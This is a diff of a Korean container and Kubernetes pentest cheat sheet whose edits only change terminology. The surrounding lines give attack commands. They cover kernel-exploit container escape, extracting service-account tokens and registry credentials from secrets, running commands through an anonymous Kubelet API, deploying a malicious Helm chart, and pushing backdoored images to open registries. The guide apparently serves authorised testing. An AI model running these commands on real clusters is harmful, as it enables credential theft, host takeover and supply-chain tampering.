@@ -96,13 +96,13 @@ mount | grep -E 'on /etc| on /root| on /var/run/docker.sock'
 # → 발견 시 해당 경로로 호스트 파일 직접 수정
 ```
 
-#### 6) DirtyPipe / DirtyCOW / overlayfs 류 커널 익스플로잇
+#### 6) DirtyPipe / DirtyCOW / overlayfs 류 커널 exploit
 
 호스트와 컨테이너는 커널을 공유 → 커널 LPE 가 곧 탈출.
 
 ```bash
 uname -a
-# 해당 커널 취약점 매핑 후 익스플로잇
+# 해당 커널 취약점 매핑 후 exploit
 ```
 
 ### 자동화 도구
@@ -234,7 +234,7 @@ kubectl get secret <token-secret> -n <ns> -o jsonpath='{.data.token}' | base64 -
 ```bash
 kubectl get secret -A -o yaml | grep -A2 dockerconfigjson
 kubectl get secret <regcred> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
-# → 사설 레지스트리 credential → 내부 이미지 변조
+# → 사설 Registry credential → 내부 이미지 변조
 ```
 
 ### 자동 점검 도구
@@ -253,10 +253,10 @@ kube-hunter --pod              # 파드 내부에서
 
 ---
 
-## 컨테이너 레지스트리 / Supply Chain
+## 컨테이너 Registry / Supply Chain
 
 ```bash
-# 노출된 레지스트리 식별
+# 노출된 Registry 식별
 curl http://<registry>:5000/v2/_catalog
 curl http://<registry>:5000/v2/<repo>/tags/list
 
@@ -305,7 +305,7 @@ Kubelet API에 익명 접근(`--anonymous-auth=true`)이 허용되어 있다면,
 # Kubelet 포트 확인 (일반적으로 10250, 10255(read-only))
 curl -sk https://<node-ip>:10250/pods | jq .
 
-# 팟 정보 파싱 후 명령 실행 (예: namespace: default, pod: nginx, container: nginx)
+# 팟 정보 parsing 후 명령 실행 (예: namespace: default, pod: nginx, container: nginx)
 curl -sk -X POST "https://<node-ip>:10250/run/default/nginx/nginx" -d "cmd=ls -la"
 ```
 
@@ -321,7 +321,7 @@ helm install --name pwned ./malicious-chart
 
 ### Docker Registry (5000)
 
-사설 레지스트리가 인증 없이 열려있을 때, 컨테이너 이미지를 다운로드하거나 백도어 이미지를 푸시할 수 있다.
+사설 Registry가 인증 없이 열려있을 때, 컨테이너 이미지를 download하거나 백도어 이미지를 푸시할 수 있다.
 
 ```bash
 # 카탈로그 확인
